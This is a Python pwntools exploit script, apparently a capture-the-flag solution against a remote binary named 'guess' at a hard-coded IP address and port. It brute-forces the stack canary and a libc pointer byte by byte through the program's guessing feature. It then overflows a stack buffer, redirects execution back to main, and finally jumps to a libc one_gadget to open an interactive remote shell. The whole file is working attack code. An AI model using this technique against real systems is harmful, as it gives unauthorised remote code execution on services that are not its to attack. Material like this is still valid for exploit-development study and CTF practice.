#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'error'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


exe = ELF('./guess')
libc = ELF('./libc.so.6')

rop = ROP(exe)

def bf_canary():
  canary = b''
  offset = 0x20
  i = 0
  while (True):
    for j in range(256):
      p.sendlineafter('(0-7)? ', str(offset))
      p.sendlineafter('guess: ', str(j))
      answer = p.recvline()
      if b'got it' in answer:
        canary += p8(j)
        print('canary = '+hexdump(canary))
        i += 1
        offset +=1
        if (i>7):
          return(canary)

def bf_libc():
  temp = b''
  offset = 0x30
  i = 0
  while (True):
    for j in range(256):
      p.sendlineafter('(0-7)? ', str(offset))
      p.sendlineafter('guess: ', str(j))
      answer = p.recvline()
      if b'got it' in answer:
        temp += p8(j)
        print('libc = '+hexdump(temp))
        i += 1
        offset +=1
        if (i>7):
          return(temp)

host, port = "193.57.159.27" ,"46674"

p = remote(host,port)

canary = bf_canary()

# first do a ret2main
payload = b'A'*0x18 + canary +p64(0xdeadbeef)+p8(0x99)
p.sendafter('game? ', payload)

leak = u64(bf_libc())
libc.address = leak - 0x270b3
print('libc base = '+hex(libc.address))

# then now that we know libc base ret2 onegadget
onegadgets = one_gadget('libc.so.6', libc.address)
payload = b'A'*0x18 + canary + p64(0xdeadbeef)+ p64(onegadgets[0])
p.sendafter('game? ', payload)

p.interactive()

